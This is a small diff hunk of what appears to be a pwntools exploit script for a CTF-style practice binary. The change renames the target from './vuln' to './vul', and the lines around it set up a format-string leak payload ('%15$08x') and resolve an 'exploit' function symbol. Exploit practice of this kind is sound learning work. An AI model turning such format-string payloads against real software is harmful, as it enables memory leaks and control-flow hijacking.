@@ -2,8 +2,8 @@
 from pwn import *
 context.log_level = 'debug'
 context.arch = 'i386'
-p = process('./vuln')
-elf = ELF('./vuln')
+p = process('./vul')
+elf = ELF('./vul')
 exploit_addr = elf.symbols['exploit']
 gdb.attach(p)
 payload1 = '%15$08x'
